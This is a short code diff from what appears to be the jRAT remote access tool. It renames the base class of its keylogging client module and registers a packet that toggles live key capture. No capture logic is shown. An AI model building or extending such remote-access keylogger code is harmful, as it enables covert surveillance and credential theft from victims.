@@ -1,12 +1,12 @@
 package jrat.module.keys;
 
-import jrat.api.Module;
+import jrat.api.ClientModule;
 import jrat.client.packets.incoming.IncomingPackets;
 import jrat.module.keys.packets.PacketToggleLive;
 import org.jnativehook.GlobalScreen;
 import oslib.OperatingSystem;
 
-public class KeysClientModule extends Module {
+public class KeysClientModule extends ClientModule {
 
     public void init() throws Exception {
         IncomingPackets.register((short) 125, PacketToggleLive.class);
